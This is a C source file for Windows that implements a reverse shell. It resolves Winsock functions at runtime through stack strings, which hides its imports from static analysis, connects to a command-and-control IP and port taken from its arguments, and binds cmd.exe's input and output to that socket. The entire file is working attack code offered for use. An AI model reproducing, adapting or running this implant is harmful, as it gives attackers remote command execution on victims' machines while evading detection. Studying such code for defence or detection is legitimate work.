#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

// Function Defination via MinGW
typedef int (WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned __LONG32 (WSAAPI* INET_ADDR)(const char *cp);
typedef u_short (WSAAPI* HTONS)(u_short hostshort);
typedef int (WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int (WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int (WSAAPI* WSACLEANUP)(void);


void RunShell(char* C2Server, int C2Port)
{
    // Loading the Ws2_32 Module
    CHAR ws2_32_fmt[] = {'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0};
    HANDLE hws2 = LoadLibraryA(ws2_32_fmt);

    // Calling all the Function Pointer of that respected function
    // Also use the stack_string.py to create Stack_String of the Function
    CHAR WSAStartup_s[] = {'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0};
    WSASTARTUP fnWSAStartup = (WSASTARTUP)GetProcAddress(hws2, WSAStartup_s);
    CHAR WSASocketA_s[] = {'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'A', 0};
    WSASOCKETA fnWSASocketA = (WSASOCKETA)GetProcAddress(hws2, WSASocketA_s);
    CHAR inet_addr_s[] = {'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0};
    INET_ADDR fninet_addr = (INET_ADDR)GetProcAddress(hws2, inet_addr_s);
    CHAR htons_s[] = {'h', 't', 'o', 'n', 's', 0};
    HTONS fnhtons = (HTONS)GetProcAddress(hws2, htons_s);
    CHAR WSAConnect_s[] = {'W', 'S', 'A', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0};
    WSACONNECT fnWSAConnect = (WSACONNECT)GetProcAddress(hws2, WSAConnect_s);
    CHAR closesocket_s[] = {'c', 'l', 'o', 's', 'e', 's', 'o', 'c', 'k', 'e', 't', 0};
    CLOSESOCKET fnclosesocket = (CLOSESOCKET)GetProcAddress(hws2, closesocket_s);
    CHAR WSACleanup_s[] = {'W', 'S', 'A', 'C', 'l', 'e', 'a', 'n', 'u', 'p', 0};
    WSACLEANUP fnWSACleanup = (WSACLEANUP)GetProcAddress(hws2, WSACleanup_s);


    SOCKET Socket;
    struct sockaddr_in addr;
    WSADATA version;
    fnWSAStartup(MAKEWORD(2,2), &version);
    Socket = fnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    addr.sin_family = AF_INET;

    addr.sin_addr.s_addr = fninet_addr(C2Server);
    addr.sin_port = fnhtons(C2Port);

    if (fnWSAConnect(Socket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0,0) == SOCKET_ERROR)
    {
        fnclosesocket(Socket);
        fnWSACleanup();
    }
    else
    {
        // Printing String using Stack Strings
        CHAR connected_fmt[] = {'C', 'o', 'n', 'n', 'e', 'c', 't', 'e', 'd', ' ', 't', 'o', ' ', '%', 's', ':', ' ', '%', 'd', '\n', 0};
        printf( connected_fmt, C2Server, C2Port);

        CHAR cmd_exe_s[] = {'c', 'm', 'd', '.', 'e', 'x', 'e', 0};
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) Socket;
        CreateProcess(NULL, cmd_exe_s, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

        printf("Process Created %lu \n", pinfo.dwProcessId);

        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
}

int main(int argc, char **argv)
{
    if (argc == 3)
    {
        int port = atoi(argv[2]);

        RunShell(argv[1], port);
    }
    else
    {
        CHAR help_fmt[] = {'p', 'y', 't', 'h', 'o', 'n', ' ', '%', 's', ' ', 'I', 'P', ' ', 'P', 'O', 'R', 'T', 0};
        printf(help_fmt, argv[0]);
        return 1;
    }

    return 0;
}